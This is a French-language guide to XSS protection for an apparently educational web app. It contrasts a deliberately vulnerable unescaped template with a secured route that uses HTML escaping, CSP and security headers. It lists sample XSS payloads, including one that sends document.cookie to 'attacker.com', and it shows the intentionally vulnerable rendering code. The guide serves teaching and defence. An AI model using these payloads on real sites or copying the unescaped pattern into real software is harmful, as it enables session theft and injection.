# Protection contre les attaques XSS - Guide complet

## Vue d'ensemble

Ce document décrit les mesures de sécurité implémentées pour protéger l'application contre les attaques **Cross-Site Scripting (XSS)**. Une version sécurisée complète de l'interface web a été créée, accessible à `/secure`.

## Vulnérabilités XSS - Version originale (`/`)

La route `/` contient intentionnellement une vulnérabilité XSS à des fins pédagogiques :

```typescript
// ⚠️ VULNÉRABLE - Ne pas utiliser en production
const messagesHtml = messages.map(msg => `
  <div class="message-item">
    <div class="message-id">Message #${msg.id}</div>
    <div class="message-body">${msg.body}</div>  <!-- Contenu non échappé -->
  </div>
`).join('');
```

### Exemples d'attaques possibles

1. **Injection de script** :
   ```html
   <script>alert('XSS')</script>
   ```

2. **Événements malveillants** :
   ```html
   <img src=x onerror="alert('XSS')">
   <svg onload="alert('XSS')">
   <iframe src="javascript:alert('XSS')">
   ```

3. **Vol de données** :
   ```html
   <img src=x onerror="fetch('https://attacker.com?cookies=' + document.cookie)">
   ```

4. **Défacement** :
   ```html
   <img src=x onerror="document.body.innerHTML='Site compromis'">
   ```

## Protections implémentées - Version sécurisée (`/secure`)

### 1. Échappement HTML (Escaping)

Tous les contenus utilisateurs sont convertis en entités HTML avant injection dans le DOM.

**Fonction d'échappement** (`src/lib/templates.ts`) :

```typescript
function escapeHtml(text: string | number): string {
  const map: Record<string, string> = {
    '&': '&amp;',      // Prévient les injections d'entités
    '<': '&lt;',       // Prévient les balises HTML
    '>': '&gt;',       // Prévient les fermetures de balises
    '"': '&quot;',     // Prévient les attributs malveillants
    "'": '&#039;',     // Prévient les attributs simples
  };
  return String(text).replace(/[&<>"']/g, (char) => map[char] ?? char);
}
```

**Application sécurisée** :

```typescript
export async function generateSecureHomePage(messages: Message[]): Promise<string> {
  // ✅ SÉCURISÉ - Tous les contenus sont échappés
  const messagesHtml = messages.map(msg => `
    <div class="message-item">
      <div class="message-id">Message #${escapeHtml(String(msg.id))}</div>
      <div class="message-body">${escapeHtml(msg.body)}</div>
    </div>
  `).join('');

  const templateContent = await loadTemplate('index-secure.html');
  return templateContent.replace('{{MESSAGES_PLACEHOLDER}}', messagesContent);
}
```

### 2. Content Security Policy (CSP)

La page sécurisée implémente une CSP stricte qui limite l'exécution de code :

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self'
">
```

**Effets** :
- Les scripts externes ne peuvent pas être exécutés
- Les styles inline seulement depuis le serveur
- Les images proviennent du serveur ou du data URI
- Pas d'embedding de la page dans un iframe
- Les formulaires peuvent seulement soumettre au même serveur

### 3. Headers de sécurité supplémentaires

```html
<!-- Prévient le reniflement MIME -->
<meta http-equiv="X-Content-Type-Options" content="nosniff">

<!-- Active la protection XSS dans les vieux navigateurs -->
<meta http-equiv="X-XSS-Protection" content="1; mode=block">

<!-- Prévient le clickjacking (embedding dans une iframe) -->
<meta http-equiv="X-Frame-Options" content="DENY">
```

### 4. Routes sécurisées

Deux nouvelles routes ont été ajoutées à `src/lib/app.ts` :

| Route | Méthode | Description |
|-------|---------|-------------|
| `/secure` | GET | Affiche la page web sécurisée |
| `/secure` | POST | Traite le formulaire sécurisé |

**Gestionnaire GET `/secure`** :

```typescript
const secureHomeHandler: RequestHandler = async (_req, res) => {
  try {
    const messages = messageRepository.listMessages();
    const html = await generateSecureHomePage(messages);  // Utilise la fonction sécurisée
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
  } catch {
    res.status(500).json({ error: 'Erreur lors du chargement de la page sécurisée' });
  }
};
```

### 5. Template sécurisé

Le nouveau fichier `src/templates/index-secure.html` intègre :

- Meta tags de sécurité complets
- CSP stricte dans le header
- Pas de boutons d'injection XSS (uniquement à des fins de démonstration)
- Contenu utilisateur affiché comme texte brut
- Design distinct (vert au lieu de violet) pour différencier de la version vulnérable

## Fichiers modifiés

### Créés
- **`src/templates/index-secure.html`** - Template HTML sécurisé avec CSP et headers de sécurité
- **`doc/XSS-FIXES.md`** - Ce fichier

### Modifiés
- **`src/lib/templates.ts`**
  - Ajout de la fonction `escapeHtml()`
  - Ajout de la fonction `generateSecureHomePage()`
  - Commentaires détaillés sur les vulnérabilités XSS intentionnelles

- **`src/lib/template-loader.ts`**
  - Support du chargement de multiples templates nommés
  - Paramètre optionnel `templateName`
  - Cache indépendant par template

- **`src/lib/app.ts`**
  - Import de `generateSecureHomePage`
  - Ajout du gestionnaire `secureHomeHandler`
  - Ajout du gestionnaire `secureHomePostHandler`
  - Routes `/secure` GET et POST

## Comparaison : Vulnérable vs Sécurisé

### Entrée utilisateur

```
<script>alert('XSS')</script>
```

### Rendu vulnérable (`/`)

Le script s'exécute dans le navigateur :

```html
<div class="message-body"><script>alert('XSS')</script></div>
<!-- ⚠️ Une boîte d'alerte s'affiche -->
```

### Rendu sécurisé (`/secure`)

Le contenu est affiché comme texte brut :

```html
<div class="message-body">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
<!-- ✅ Le texte littéral s'affiche : <script>alert('XSS')</script> -->
```

## Bonnes pratiques appliquées

### ✅ À FAIRE
1. **Toujours échapper** les contenus utilisateurs avant injection dans le DOM
2. **Utiliser une CSP stricte** pour mitiger les attaques XSS
3. **Valider à la frontière** - Traiter les entrées utilisateurs comme non fiables
4. **Utiliser des frameworks modernes** (React, Vue, Angular) qui échappent par défaut
5. **Headers de sécurité** - Ajouter X-XSS-Protection, X-Content-Type-Options, X-Frame-Options
6. **Tester avec des payloads** - Valider la protection contre les injections communes

### ❌ À NE PAS FAIRE
1. **Concaténer directement** les entrées utilisateurs dans le HTML
2. **Utiliser `innerHTML`** avec des données non fiables
3. **Créer du contenu dynamique** sans validation/escaping
4. **Utiliser `eval()`** ou `new Function()` avec du contenu utilisateur
5. **Ignorer les headers de sécurité** - Toujours les configurer
6. **Faire confiance aux données** provenant de sources externes

## Testage

### Tester la version vulnérable

1. Ouvrir `http://localhost:3000`
2. Copier un payload d'injection XSS dans le formulaire
3. Observer l'exécution du JavaScript

Exemples de payloads (voir `src/test/xss.test.ts`) :
- `<script>alert('XSS via script')</script>`
- `<img src=x onerror="alert('XSS via img')">`
- `<svg onload="alert('XSS via svg')">`
- `<iframe src="javascript:alert('XSS via iframe')"></iframe>`

### Tester la version sécurisée

1. Ouvrir `http://localhost:3000/secure`
2. Copier les mêmes payloads dans le formulaire
3. Observer que le contenu est affiché en tant que texte brut (pas d'exécution)

### Tests automatisés

Exécuter les tests pour vérifier les protections :

```bash
npm test
```

Les tests incluent :
- Vérification de l'escaping HTML
- Validation du contenu affiché en texte brut
- Tests de sécurité côté serveur et client

## Références OWASP

- [OWASP Top 10 - A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP Content Security Policy](https://owasp.org/www-community/attacks/xss/#defense-content-security-policy)

## Environnement de production

Pour un environnement de production :

1. **Toujours** utiliser HTTPS
2. **Configurer une CSP complète** incluant tous les domaines approuvés
3. **Ajouter les headers** : HSTS, X-Frame-Options, X-Content-Type-Options
4. **Valider côté serveur** toutes les entrées utilisateurs
5. **Utiliser des sanitizers** comme DOMPurify pour le contenu enrichi
6. **Audit régulier** des dépendances pour les vulnérabilités
7. **WAF (Web Application Firewall)** - Considérer un WAF pour protection additionnelle
8. **Monitoring** - Logger et surveiller les tentatives d'injection

## Conclusion

La version sécurisée (`/secure`) démontre comment protéger une application web contre les attaques XSS en appliquant plusieurs couches de défense :

1. **Escaping HTML** - Première ligne de défense
2. **Content Security Policy** - Limite l'impact des attaques
3. **Headers de sécurité** - Protection supplémentaire
4. **Validation côté serveur** - Prévention à la source

Ces mesures, combinées, créent un périmètre de sécurité robuste contre les attaques XSS.
